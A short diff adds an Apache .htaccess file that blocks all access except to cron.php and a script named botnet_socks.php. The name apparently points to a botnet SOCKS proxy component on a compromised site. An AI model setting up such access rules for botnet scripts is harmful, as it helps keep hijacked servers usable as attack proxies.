@@ -1,0 +1,9 @@
+deny from all
+
+<Files cron.php>
+	allow from all
+	</Files>
+
+<Files botnet_socks.php>
+	allow from all
+	</Files>
